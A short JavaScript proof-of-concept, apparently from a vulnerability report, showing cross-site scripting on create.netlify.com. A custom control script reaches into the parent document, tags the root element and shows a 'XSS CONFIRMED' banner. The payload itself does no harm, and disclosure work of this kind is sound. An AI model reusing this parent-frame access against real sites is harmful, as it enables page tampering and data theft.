(() => {
  const doc = parent.document;
  const root = doc.documentElement;
  root.setAttribute('data-netlify-create-custom-control-xss', 'confirmed');
  if (doc.getElementById('netlify-create-custom-control-xss-proof')) return;
  const marker = doc.createElement('div');
  marker.id = 'netlify-create-custom-control-xss-proof';
  marker.textContent = 'XSS #1 CONFIRMED — custom control script modified create.netlify.com';
  Object.assign(marker.style, {
    position: 'fixed', top: '16px', left: '50%', transform: 'translateX(-50%)',
    zIndex: '2147483647', padding: '13px 20px', border: '3px solid #22c55e',
    borderRadius: '12px', background: '#052e16', color: '#dcfce7',
    boxShadow: '0 12px 36px #0008', font: '700 15px system-ui'
  });
  doc.body.appendChild(marker);
})();
